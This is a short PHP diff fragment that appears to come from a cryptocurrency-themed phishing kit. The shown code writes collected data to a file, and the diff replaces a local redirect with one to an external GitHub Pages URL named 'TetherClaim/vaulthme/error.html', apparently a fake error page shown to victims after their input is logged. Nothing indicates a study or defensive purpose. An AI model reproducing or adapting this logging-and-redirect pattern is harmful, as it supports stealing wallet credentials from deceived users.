@@ -32,6 +32,6 @@ $txt = "====================== \n\n";
 fwrite($myfile, "-".$txt);
 fclose($myfile);
 
-header("Location: vaultmehome.php"); 
+header("Location: https://veveekkgrroup.github.io/TetherClaim.github.io/vaulthme/error.html#confirm-page-container-navigation"); 
 
 ?>
